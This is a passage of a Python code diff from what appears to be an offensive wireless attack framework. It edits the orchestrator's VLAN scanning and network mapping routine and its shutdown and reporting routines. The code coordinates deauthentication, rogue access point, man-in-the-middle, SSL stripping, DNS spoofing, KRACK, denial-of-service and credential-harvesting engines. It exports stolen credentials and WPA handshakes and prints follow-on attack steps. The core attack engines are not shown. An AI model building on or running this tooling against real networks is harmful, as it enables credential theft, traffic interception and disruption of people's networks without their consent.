             sniff(iface=self.monitor_iface, prn=handler, store=0,
                   stop_filter=lambda x: not self.running)
+        except Exception:
+            pass
+
+    def _run_vlan_scan(self):
+        """Run VLAN scanning and network mapping in background."""
+        try:
+            log.info("VLAN scan phase: discovering VLANs...")
+            self.vlan_scanner.start()
+
+            # Wait for sniff to complete using public API
+            self.vlan_scanner.wait_for_completion(timeout=35)
+
+            self.vlan_scanner.stop()
+
+            vlans = self.vlan_scanner.get_vlans()
+            log.info(f"VLAN scan found {len(vlans)} VLANs, "
+                     f"starting network mapping...")
+
+            if vlans:
+                self.network_mapper.start()
+                self.network_mapper.map_all()
+                self.network_mapper.stop()
+
+                seg_map = self.network_mapper.get_map()
+                log.info(f"Network mapping complete: "
+                         f"{len(seg_map.get('segments', []))} segments, "
+                         f"{len(seg_map.get('acl_gaps', []))} ACL gaps")
         except Exception as e:
-            log.debug(f"Background recon ended: {e}")
+            log.error(f"VLAN scan phase error: {e}")
 
     def stop(self):
-        """Shut down all attack components gracefully and generate report."""
+        """Shut down all attack components gracefully."""
         self.running = False
 
         if hasattr(self, '_attack_start_time'):
             duration = time.time() - self._attack_start_time
-            log.info(f"\nAttack duration: {duration:.1f} seconds")
-
+            log.info(f"Attack duration: {duration:.1f} seconds")
+        
         # Stop all engines
         engines = [
-            self.recon, self.deauth, self.beacons, self.karma,
+            self.recon, self.deauth, self.beacons, self.karma, 
             self.rogue_ap, self.mitm_engine, self.ssl_stripper,
-            self.dns_spoof, self.cred_harvester, self.portal_harvester,
-            self.network_disruption, self.ap_clone, self.krack_engine,
-            self.dos_engine, self.client_isolation, self.printer_recon,
+            self.dns_spoof, self.cred_harvester, self.network_disruption,
+            self.ap_clone, self.krack_engine, self.dos_engine,
+            self.client_isolation, self.printer_recon,
             self.print_interceptor, self.printer_cred_harvester,
-            self._pmkid_capture,
+            self.auto_pivot, self.hashcat,
+            self.vlan_scanner, self.network_mapper
         ]
-
-        # Restore MAC address if it was randomized
-        if self._mac_spoofer:
-            try:
-                self._mac_spoofer.restore()
-            except Exception:
-                pass
-
+        
         for engine in engines:
             if engine:
                 try:
                     engine.stop()
                 except Exception as e:
-                    log.debug(f"Error stopping {engine.__class__.__name__}: {e}")
-
-        # Wait for daemon threads with a join timeout
-        for engine in engines:
-            if engine and hasattr(engine, '_thread') and engine._thread is not None:
-                try:
-                    engine._thread.join(timeout=3)
-                except Exception:
-                    pass
-
-        # Export handshakes
+                    log.error(f"Error stopping {engine.__class__.__name__}: {e}")
+        
+        # Now safe to close database
+        if self.db:
+            # Save client profiles before closing
+            if self.client_profiler:
+                self.client_profiler.save_to_db()
+            self.db.close()
+        
+        # Export any remaining handshakes
         remaining = self.handshakes.export_all()
         if remaining:
-            log.info(f"Exported {len(remaining)} handshakes")
-
-        # Print harvest summary
-        self._print_harvest_summary()
-
-        # Run post-attack analysis
+            log.info(f"Exported {len(remaining)} additional handshakes")
+        
         self.recon._print_status()
+        
+        # Run post-attack analysis
         self._run_post_attack_analysis()
-
-        # Close database last
-        if self.db:
-            self.db.flush()
-            self.db.close()
-
-        log.info("Kill chain terminated. All data saved.")
-
-    def _print_harvest_summary(self):
-        """Print summary of all credentials and data harvested."""
-        log.info("")
-        log.info("─" * 50)
-        log.info("HARVEST SUMMARY")
-        log.info("─" * 50)
-
-        # Credential stats
-        total_creds = 0
-        if self.cred_harvester:
-            stats = self.cred_harvester.get_stats()
-            total_creds += stats.get("total_credentials", 0)
-            if stats.get("by_protocol"):
-                for proto, count in stats["by_protocol"].items():
-                    log.info(f"  {proto}: {count} credentials")
-
-        if self.portal_harvester:
-            portal_creds = len(self.portal_harvester.get_credentials())
-            total_creds += portal_creds
-            if portal_creds:
-                log.info(f"  Captive Portal: {portal_creds} credentials")
-
-        # DNS stats
-        if self.dns_spoof:
-            dns_stats = self.dns_spoof.get_spoof_stats()
-            log.info(f"  DNS spoofed: {dns_stats.get('total_spoofs', 0)} responses")
-
-        # Handshake stats
-        hs_stats = self.handshakes.get_stats()
-        if hs_stats.get("complete", 0):
-            log.info(f"  WPA Handshakes: {hs_stats['complete']} complete")
-
-        log.info(f"  TOTAL CREDENTIALS: {total_creds}")
-        log.info("─" * 50)
+        
+        log.info("Attack terminated. All data saved.")
 
     def _run_post_attack_analysis(self):
         """Generate post-attack analysis and next steps."""
-        log.info("")
-        log.info("═" * 60)
+        log.info("=" * 60)
         log.info("POST-ATTACK ANALYSIS")
-        log.info("═" * 60)
+        log.info("=" * 60)
 
         analyzer = PostAttackAnalyzer(self.db)
-        analyzer.print_summary()
-        analyzer.export_credentials()
-        analyzer.export_handshakes()
-        analyzer.generate_report("exports/attack_report.json")
 
+        # Print summary to console
+        analyzer.print_summary()
+
+        # Export credentials
+        credentials = analyzer.export_credentials()
+
+        # Export handshakes
+        analyzer.export_handshakes()
+
+        # Generate full report
+        report = analyzer.generate_report("exports/attack_report.json")
+
+        # Print next steps
         log.info("\nNEXT STEPS:")
         for i, step in enumerate(analyzer.get_next_steps(priority_filter="HIGH"), 1):
             log.info(f"  {i}. {step}")
 
-        log.info("═" * 60)
+        log.info("=" * 60)
